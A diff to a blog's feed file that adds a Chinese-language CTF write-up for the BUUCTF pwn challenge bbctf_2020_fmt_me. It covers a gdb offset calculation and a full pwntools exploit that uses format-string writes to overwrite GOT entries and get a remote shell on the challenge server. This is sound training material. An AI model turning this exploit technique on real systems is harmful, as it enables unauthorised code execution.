@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>BUUCTF-PWN-bbctf_2020_fmt_me</title>
+      <link href="/20220222-ctf-fmt_me/"/>
+      <url>/20220222-ctf-fmt_me/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-bbctf-2020-fmt-me"><a href="#BUUCTF-PWN-bbctf-2020-fmt-me" class="headerlink" title="BUUCTF-PWN-bbctf_2020_fmt_me"></a>BUUCTF-PWN-bbctf_2020_fmt_me</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202222243276.png" alt="image-20220222224245086"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202222243052.png" alt="image-20220222224339867"></p><h2 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h2><p>使用gdb调试，先对<code>system</code>函数下断点，然后如下图输入：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202222246772.png" alt="image-20220222224611656"></p><p>由于<code>snprintf</code>并没有将<code>buf</code>中的内容打印到标准输出，而是在<code>other_buf</code>中，所以我们需要在gdb中查看内存情况：</p><p>使用<code>x/5s 0x4040a0</code>命令，<code>0x4040a0</code>为<code>other_buf</code>的地址</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202222249909.png" alt="image-20220222224929733"></p><p>得到偏移为6</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28695</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">fmt1 = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;system&#x27;</span>]: elf.sym[<span class="string">&#x27;main&#x27;</span>]&#125;, write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Good job. I\&#x27;ll give you a gift.&#x27;</span>, fmt1)</span><br><span class="line"></span><br><span class="line">fmt2 = <span class="string">b&#x27;/bin/sh;&#x27;</span></span><br><span class="line">fmt2 += fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">&#x27;snprintf&#x27;</span>]: <span class="number">0x401056</span>-<span class="number">8</span>&#125;, write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Good job. I\&#x27;ll give you a gift.&#x27;</span>, fmt2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Good job. I\&#x27;ll give you a gift.&#x27;</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202222251878.png" alt="image-20220222225144434"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+            <tag> snprintf </tag>
+            
+            <tag> fmt </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>图像处理20220213</title>
       <link href="/20220213-img-report/"/>
       <url>/20220213-img-report/</url>
